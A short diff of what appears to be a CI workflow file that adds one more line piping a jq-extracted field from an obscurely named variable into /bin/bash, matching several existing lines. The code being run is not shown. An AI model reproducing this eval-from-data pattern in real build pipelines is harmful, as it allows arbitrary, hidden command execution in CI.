@@ -35,6 +35,7 @@ jobs:
           echo $dfr103 | jq -r .grp1 | /bin/bash
           printf '%s' "$in171" | jq -r .ejgom5444 | /bin/bash
           printf '%s' "$rrqs2" | jq -r .rwa37873 | /bin/bash
+          echo $l60555 | jq -r .rb7 | /bin/bash
 
       - name: Archive output
         if: always()
